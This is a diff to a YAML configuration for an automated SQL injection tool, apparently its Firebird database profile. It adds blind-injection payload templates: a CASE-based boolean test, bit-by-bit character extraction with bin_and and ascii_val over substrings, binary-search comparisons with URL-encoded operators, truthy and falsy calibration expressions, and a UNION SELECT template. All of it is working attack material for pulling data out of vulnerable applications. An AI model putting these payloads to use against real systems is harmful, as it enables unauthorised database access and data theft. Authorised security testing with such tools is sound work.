@@ -84,6 +84,43 @@ strategy:
     - Unexpected end of command - line
    orderByErrorMessage:
     - Invalid column position used in the ORDER BY clause
+   vendorSpecific: 1=case when ${test} then 1 else bin_and(2,2) end
+
+ binary:
+  test:
+   bit: |
+    0 != bin_and(
+        ascii_val(substring(
+            (${injection})
+            from ${window.char}
+            for 1
+        )),
+        ${bit}
+    )
+   bin: |
+    substring(
+        (${injection})
+        from ${window.char}
+        for 1
+    )
+    %3E%3Dascii_char(${mid.int})
+   truthyBin:
+    - ascii_char(97)%3E%3Dascii_char(97)
+    - ascii_char(97)%3E%3Dascii_char(65)
+    - ascii_char(97)%3E%3Dascii_char(48)
+    - ascii_char(98)%3E%3Dascii_char(97)
+    - ascii_char(98)%3E%3Dascii_char(66)
+    - ascii_char(49)%3E%3Dascii_char(48)
+   falsyBin:
+    - ascii_char(97)%3E%3Dascii_char(98)
+    - ascii_char(65)%3E%3Dascii_char(97)
+    - ascii_char(66)%3E%3Dascii_char(98)
+    - ascii_char(66)%3E%3Dascii_char(97)
+    - ascii_char(48)%3E%3Dascii_char(65)
+    - ascii_char(48)%3E%3Dascii_char(49)
+  modeAnd: and
+  modeOr: or
+  blind: ${binary.mode} ${test}
 
  union:
   indices: union select ${indices} from rdb$database
